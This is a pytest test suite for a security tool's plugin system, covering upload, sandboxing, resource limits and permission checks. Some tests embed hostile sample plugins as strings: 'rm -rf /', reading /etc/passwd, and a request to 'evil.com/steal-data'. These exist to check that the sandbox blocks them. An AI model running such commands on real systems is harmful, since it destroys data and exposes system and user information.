"""
End-to-End Tests for Plugin Execution Flow
Tests the complete plugin lifecycle from upload to execution
"""

import pytest
import tempfile
import zipfile
import json
import time
from pathlib import Path
from unittest.mock import patch, Mock

from byteguardx.plugins.plugin_manager import plugin_manager
from byteguardx.security.plugin_sandbox import plugin_sandbox
from byteguardx.api.app import create_app

class TestPluginExecutionFlow:
    """Test complete plugin execution flow"""
    
    @pytest.fixture
    def app(self, test_secrets):
        """Create test Flask app"""
        app = create_app()
        app.config.update({
            'TESTING': True,
            'SECRET_KEY': test_secrets['SECRET_KEY'],
            'JWT_SECRET': test_secrets['JWT_SECRET'],
            'CSRF_ENABLED': False
        })
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client"""
        return app.test_client()
    
    @pytest.fixture
    def mock_plugin_zip(self):
        """Create mock plugin ZIP file"""
        plugin_code = '''
def scan_file(file_info):
    """Mock plugin scan function"""
    return [{
        'type': 'test_finding',
        'severity': 'low',
        'message': 'Test finding from mock plugin',
        'file': file_info.get('path', 'unknown'),
        'line': 1
    }]

def get_info():
    """Plugin information"""
    return {
        'name': 'Mock Test Plugin',
        'version': '1.0.0',
        'description': 'Mock plugin for testing'
    }
'''
        
        manifest = {
            'name': 'mock_test_plugin',
            'version': '1.0.0',
            'author': 'Test Author',
            'description': 'Mock plugin for testing',
            'permissions': ['read_files'],
            'trusted': False,
            'hash': 'mock_hash_for_testing',
            'entry_point': 'plugin.py'
        }
        
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as zip_file:
            with zipfile.ZipFile(zip_file.name, 'w') as zf:
                zf.writestr('plugin.py', plugin_code)
                zf.writestr('manifest.json', json.dumps(manifest, indent=2))
                zf.writestr('README.md', '# Mock Test Plugin\nFor testing purposes only.')
            
            yield zip_file.name
        
        # Cleanup
        Path(zip_file.name).unlink(missing_ok=True)
    
    def test_plugin_upload_and_validation(self, client, mock_plugin_zip):
        """Test plugin upload and validation process"""
        # Test plugin upload
        with open(mock_plugin_zip, 'rb') as f:
            response = client.post('/api/v1/plugins/upload', 
                                 data={'file': (f, 'mock_plugin.zip')},
                                 content_type='multipart/form-data')
        
        assert response.status_code == 200
        data = response.get_json()
        assert 'plugin_id' in data
        assert data['status'] == 'uploaded'
        
        plugin_id = data['plugin_id']
        
        # Test plugin validation
        response = client.get(f'/api/v1/plugins/{plugin_id}')
        assert response.status_code == 200
        
        plugin_data = response.get_json()
        assert plugin_data['name'] == 'mock_test_plugin'
        assert plugin_data['status'] == 'uploaded'
    
    def test_plugin_installation_flow(self, client, mock_plugin_zip):
        """Test plugin installation process"""
        # Upload plugin
        with open(mock_plugin_zip, 'rb') as f:
            response = client.post('/api/v1/plugins/upload', 
                                 data={'file': (f, 'mock_plugin.zip')})
        
        plugin_id = response.get_json()['plugin_id']
        
        # Install plugin
        response = client.post(f'/api/v1/plugins/install', 
                             json={'plugin_id': plugin_id})
        
        assert response.status_code == 200
        data = response.get_json()
        assert data['status'] == 'installed'
        
        # Verify plugin is listed as installed
        response = client.get('/api/v1/plugins')
        plugins = response.get_json()['plugins']
        
        installed_plugin = next((p for p in plugins if p['id'] == plugin_id), None)
        assert installed_plugin is not None
        assert installed_plugin['status'] == 'installed'
    
    def test_plugin_execution_in_sandbox(self, mock_plugin_zip):
        """Test plugin execution in sandbox environment"""
        # Create mock plugin manifest
        manifest = {
            'name': 'mock_test_plugin',
            'version': '1.0.0',
            'author': 'Test Author',
            'description': 'Mock plugin for testing',
            'permissions': ['read_files'],
            'trusted': False,
            'hash': 'mock_hash_for_testing'
        }
        
        # Mock plugin code
        plugin_code = '''
result = {
    "findings": [
        {
            "type": "test_finding",
            "severity": "low",
            "message": "Mock finding from sandbox test"
        }
    ]
}
'''
        
        # Test plugin execution
        success, result = plugin_sandbox.execute_plugin(
            plugin_code, manifest, {'test': 'data'}
        )
        
        assert success is True
        assert 'findings' in result
        assert len(result['findings']) == 1
        assert result['findings'][0]['type'] == 'test_finding'
    
    def test_plugin_security_validation(self, client):
        """Test plugin security validation"""
        # Create malicious plugin
        malicious_code = '''
import os
import subprocess

# Attempt to execute dangerous commands
os.system("rm -rf /")
subprocess.run(["cat", "/etc/passwd"])

result = {"malicious": True}
'''
        
        malicious_manifest = {
            'name': 'malicious_plugin',
            'version': '1.0.0',
            'author': 'Malicious Actor',
            'description': 'Malicious plugin for testing security',
            'permissions': ['read_files'],
            'trusted': False,
            'hash': 'malicious_hash'
        }
        
        # Create malicious plugin ZIP
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as zip_file:
            with zipfile.ZipFile(zip_file.name, 'w') as zf:
                zf.writestr('plugin.py', malicious_code)
                zf.writestr('manifest.json', json.dumps(malicious_manifest))
            
            # Test upload of malicious plugin
            with open(zip_file.name, 'rb') as f:
                response = client.post('/api/v1/plugins/upload', 
                                     data={'file': (f, 'malicious_plugin.zip')})
            
            # Should be rejected due to security validation
            assert response.status_code == 400
            data = response.get_json()
            assert 'error' in data
            assert 'security' in data['error'].lower() or 'dangerous' in data['error'].lower()
        
        # Cleanup
        Path(zip_file.name).unlink(missing_ok=True)
    
    def test_plugin_resource_limits(self):
        """Test plugin resource limits and timeouts"""
        # Create resource-intensive plugin
        resource_intensive_code = '''
import time

# Attempt to consume excessive resources
data = []
for i in range(1000000):
    data.append("x" * 1000)

# Attempt to run for too long
time.sleep(60)

result = {"resource_intensive": True}
'''
        
        manifest = {
            'name': 'resource_intensive_plugin',
            'version': '1.0.0',
            'author': 'Test Author',
            'description': 'Resource intensive plugin for testing limits',
            'permissions': ['read_files'],
            'trusted': False,
            'hash': 'resource_test_hash'
        }
        
        # Test execution with timeout
        start_time = time.time()
        success, result = plugin_sandbox.execute_plugin(
            resource_intensive_code, manifest, {}, timeout=5
        )
        execution_time = time.time() - start_time
        
        # Should timeout or fail due to resource limits
        assert execution_time < 10  # Should not run for full 60 seconds
        assert success is False or 'error' in result
    
    def test_plugin_permission_enforcement(self):
        """Test plugin permission enforcement"""
        # Create plugin that exceeds permissions
        permission_violating_code = '''
import requests

# Attempt network access without permission
response = requests.get("https://evil.com/steal-data")

result = {"network_access": True}
'''
        
        manifest = {
            'name': 'permission_violating_plugin',
            'version': '1.0.0',
            'author': 'Test Author',
            'description': 'Plugin that violates permissions',
            'permissions': ['read_files'],  # No network permission
            'trusted': False,
            'hash': 'permission_test_hash'
        }
        
        # Test execution
        success, result = plugin_sandbox.execute_plugin(
            permission_violating_code, manifest, {}
        )
        
        # Should fail due to permission violation
        assert success is False
        assert 'error' in result
    
    def test_trusted_plugin_execution(self):
        """Test trusted plugin execution"""
        # Create trusted plugin
        trusted_code = '''
# Trusted plugin with more capabilities
import json

def process_data(input_data):
    return {
        "processed": True,
        "input_count": len(input_data),
        "timestamp": "2023-01-01T00:00:00Z"
    }

result = process_data(input_data)
'''
        
        manifest = {
            'name': 'trusted_plugin',
            'version': '1.0.0',
            'author': 'Trusted Developer',
            'description': 'Trusted plugin for testing',
            'permissions': ['read_files', 'write_files'],
            'trusted': True,
            'hash': 'trusted_plugin_hash'
        }
        
        # Test execution
        success, result = plugin_sandbox.execute_plugin(
            trusted_code, manifest, {'test': 'data'}
        )
        
        assert success is True
        assert result['processed'] is True
        assert 'input_count' in result
    
    def test_plugin_cleanup_on_failure(self, client, mock_plugin_zip):
        """Test cleanup when plugin operations fail"""
        # Upload plugin
        with open(mock_plugin_zip, 'rb') as f:
            response = client.post('/api/v1/plugins/upload', 
                                 data={'file': (f, 'mock_plugin.zip')})
        
        plugin_id = response.get_json()['plugin_id']
        
        # Simulate installation failure
        with patch('byteguardx.plugins.plugin_manager.PluginManager.install_plugin') as mock_install:
            mock_install.side_effect = Exception("Installation failed")
            
            response = client.post(f'/api/v1/plugins/install', 
                                 json={'plugin_id': plugin_id})
            
            assert response.status_code == 500
        
        # Verify plugin is not in installed state
        response = client.get(f'/api/v1/plugins/{plugin_id}')
        plugin_data = response.get_json()
        assert plugin_data['status'] != 'installed'
    
    @pytest.mark.integration
    def test_complete_plugin_lifecycle(self, client, mock_plugin_zip):
        """Test complete plugin lifecycle from upload to removal"""
        # 1. Upload
        with open(mock_plugin_zip, 'rb') as f:
            response = client.post('/api/v1/plugins/upload', 
                                 data={'file': (f, 'mock_plugin.zip')})
        
        assert response.status_code == 200
        plugin_id = response.get_json()['plugin_id']
        
        # 2. Install
        response = client.post(f'/api/v1/plugins/install', 
                             json={'plugin_id': plugin_id})
        assert response.status_code == 200
        
        # 3. Enable
        response = client.post(f'/api/v1/plugins/{plugin_id}/enable')
        assert response.status_code == 200
        
        # 4. Use plugin in scan (mock)
        with patch('byteguardx.plugins.plugin_manager.PluginManager.execute_plugin') as mock_execute:
            mock_execute.return_value = [{'type': 'test', 'message': 'Test finding'}]
            
            # Simulate scan using plugin
            response = client.post('/api/v1/scan/plugins', 
                                 json={'plugins': [plugin_id], 'code': 'test code'})
            
            # Should succeed if plugin system is working
            assert response.status_code in [200, 400]  # 400 if scan endpoint doesn't exist yet
        
        # 5. Disable
        response = client.post(f'/api/v1/plugins/{plugin_id}/disable')
        assert response.status_code == 200
        
        # 6. Uninstall
        response = client.delete(f'/api/v1/plugins/{plugin_id}/uninstall')
        assert response.status_code == 200
        
        # 7. Verify removal
        response = client.get(f'/api/v1/plugins/{plugin_id}')
        assert response.status_code == 404 or response.get_json()['status'] == 'removed'
